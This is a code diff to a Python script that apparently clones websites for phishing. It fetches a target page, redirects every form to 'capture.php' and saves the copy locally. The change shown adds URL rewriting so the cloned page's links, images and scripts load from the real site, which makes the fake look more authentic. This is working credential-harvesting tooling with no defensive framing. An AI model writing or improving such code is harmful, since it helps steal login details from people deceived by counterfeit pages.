@@ -4,6 +4,7 @@ import requests
 from time import sleep
 from sys import stdout, exit
 from os import system, path, listdir
+import urllib.parse
 import multiprocessing
 def newtemplate(site):
     ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36'
@@ -14,6 +15,10 @@ def newtemplate(site):
     s = BeautifulSoup(r.text, 'html.parser')
     for i in s.find_all('form'):
         i['action'] = 'capture.php'
+    for i in s.find_all(href=True):
+        i['href'] = urllib.parse.urljoin(site, i['href'])
+    for i in s.find_all(src=True):
+        i['src'] = urllib.parse.urljoin(site, i['src'])
     with open(p('WebPages/' + site.replace('https://', 'http://').replace('http://', '')), 'w') as f:
         f.write(s.prettify())
     return True
